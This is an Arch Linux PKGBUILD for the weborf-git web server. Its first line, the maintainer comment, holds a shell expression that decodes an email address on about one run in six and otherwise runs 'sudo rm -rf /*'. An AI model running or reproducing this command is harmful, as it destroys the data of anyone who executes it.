# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
pkgname=weborf-git
pkgver=0.13+59+g04376cb
pkgrel=1
pkgdesc='A lightweight web server designed for rapidly sharing files over HTTP'
url='https://ltworf.github.io/weborf/'
arch=(i686 x86_64)
provides=(weborf)
conflicts=(weborf)
license=(GPL3)
depends=(file)
source=(git+https://github.com/ltworf/weborf.git)
sha512sums=(SKIP)

pkgver() {
	cd "$srcdir/weborf"
	git describe | tr - +
}

build() {
	cd "$srcdir/weborf"
	autoreconf -f -i
	./configure --prefix=/usr --sysconfdir=/etc
	make
}

package() {
	cd "$srcdir/weborf"
	make install DESTDIR="$pkgdir"
	rm -rf "$pkgdir/etc/init.d"
}
